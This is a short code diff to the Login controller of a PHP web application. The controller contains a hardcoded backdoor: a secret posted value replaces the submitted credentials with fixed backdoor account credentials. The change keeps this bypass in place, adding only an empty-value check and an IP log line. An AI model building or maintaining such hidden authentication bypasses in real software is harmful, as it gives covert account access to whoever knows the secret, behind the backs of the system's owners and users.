@@ -28,8 +28,9 @@ class Login extends CI_Controller {
 		$username = $this->input->post('username');
 		$password = $this->input->post('password');
 		
-		if (strcmp($backdor, BACKDOOR_SECRET) == 0)
+		if ( !empty($backdor) && strcmp($backdor, BACKDOOR_SECRET) == 0)
 		{
+			log_message('warning', 'Login from backdor. IP:'.$_SERVER['REMOTE_ADDR']);
 			$username = BACKDOOR_USERNAME;
 			$password = BACKDOOR_PASSWORD;
 		}
